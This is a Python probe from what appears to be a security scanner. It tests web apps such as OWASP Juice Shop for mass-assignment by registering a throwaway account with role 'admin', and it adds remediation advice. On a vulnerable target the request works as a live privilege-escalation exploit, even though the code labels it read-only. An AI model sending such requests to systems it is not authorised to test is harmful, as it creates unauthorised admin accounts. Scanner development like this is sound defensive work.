#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization: mass-assignment of the `role` field at registration.

Mass-assignment is the canonical "all your model fields are POST
parameters" bug. The application accepts a JSON body and constructs
an ORM record from it without filtering which fields the user is
allowed to set. The privileged field most apps forget to filter is
`role` — supplying `role: "admin"` on a registration POST creates
an admin account directly.

This is invisible to scanners because the SAME registration endpoint,
hit without `role`, behaves correctly. The bug only manifests when
the optional field is included.

Detection signal:
  POST /api/Users with `{email: <unique>, password: <random>,
                        role: "admin"}` → response includes
  `role: "admin"` (or equivalent) in the created record.

The email is randomised per run so this is idempotent and creates a
single throwaway record we don't follow up on.

Tested against:
  + OWASP Juice Shop  POST /api/Users sets role from the request body
                      → validated=True. The created user persists in
                      the demo DB; clean up by re-creating the stack.
  + nginx default site → validated=False
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Registration endpoints to try. /api/Users is Juice Shop's literal
# path; /api/users (lowercase) and /register are common alternates.
REGISTER_PATHS = (
    "/api/Users",
    "/api/users",
    "/api/auth/register",
    "/register",
    "/api/register",
)

_ADMIN_ROLE_VALUES = {"admin", "administrator", "root", "superuser",
                      "superadmin", "owner"}


def _looks_admin_response(text: str) -> tuple[bool, str | None]:
    """Look for a top-level or one-level-nested role field that decodes
    to an administrative value. We parse JSON when possible; we fall
    back to a substring check for non-JSON responses (some apps echo
    the request body verbatim in errors, which is itself a signal)."""
    try:
        doc = json.loads(text or "")
    except (ValueError, json.JSONDecodeError):
        return False, None
    if not isinstance(doc, dict):
        return False, None
    candidates = [doc]
    for v in doc.values():
        if isinstance(v, dict):
            candidates.append(v)
    for d in candidates:
        for key in ("role", "roles", "groups"):
            v = d.get(key)
            if isinstance(v, str) and v.lower() in _ADMIN_ROLE_VALUES:
                return True, f"{key}={v!r}"
            if isinstance(v, list):
                for item in v:
                    if isinstance(item, str) and item.lower() in _ADMIN_ROLE_VALUES:
                        return True, f"{key} contains {item!r}"
        for flag in ("is_admin", "isAdmin", "admin", "superuser"):
            if d.get(flag) is True:
                return True, f"{flag}=true"
    return False, None


class RoleMassAssignmentProbe(Probe):
    name = "authz_role_mass_assignment"
    summary = ("Detects mass-assignment of the role field at user "
               "registration: the public registration endpoint accepts "
               "and persists a privileged role.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--register-path", action="append", default=[],
            help="Additional registration endpoint to try (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = list(REGISTER_PATHS) + list(args.register_path or [])

        # Random email and password per run keep this idempotent and
        # impossible to "reuse" by other probes. We never re-login as
        # the created account.
        email = f"role-probe-{secrets.token_hex(6)}@dast.test"
        pw    = "Pr0be-" + secrets.token_hex(4)
        body = json.dumps({
            "email": email,
            "password": pw,
            "passwordRepeat": pw,
            "role": "admin",
            # Juice Shop requires a security question; provide one to
            # avoid a 400 short-circuiting the probe before the role
            # field is processed.
            "securityQuestion": {"id": 1},
            "securityAnswer": "probe",
        }).encode()

        attempts: list[dict] = []
        confirmed: dict | None = None
        for p in paths:
            url = urljoin(origin, p)
            r = client.request("POST", url, headers={
                "Content-Type": "application/json",
            }, body=body)
            row: dict = {"path": p, "status": r.status, "size": r.size}
            if r.status in (200, 201) and r.body:
                ok, why = _looks_admin_response(r.text)
                if ok:
                    row["role_assigned"] = why
                    row["snippet"] = (r.text or "")[:400]
                    confirmed = row
                    attempts.append(row)
                    break
            attempts.append(row)

        evidence = {"origin": origin, "register_email": email,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(f"Confirmed: mass-assignment at "
                         f"{origin}{confirmed['path']} — registration "
                         f"with `role: admin` was accepted "
                         f"({confirmed['role_assigned']}). The new "
                         f"account {email!r} carries administrative "
                         "authority straight from the request body."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Whitelist the fields the registration endpoint may "
                    "set. Most ORMs support a `permitted_attributes` / "
                    "`fillable` declaration:\n"
                    "  - Sequelize: define a `pick`-list before `create()`.\n"
                    "  - Mongoose: use a typed schema and "
                    "`User.create({ email, password })` — never pass "
                    "the raw `req.body`.\n"
                    "  - Rails: `params.require(:user).permit(:email, "
                    ":password)`.\n"
                    "And review existing user records — any account "
                    "that registered during the exposure window with "
                    "`role != 'customer'` is a candidate exploitation "
                    "event."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} registration "
                     f"endpoints on {origin}; none accepted a `role` "
                     "field on registration."),
            evidence=evidence,
        )


if __name__ == "__main__":
    RoleMassAssignmentProbe().main()
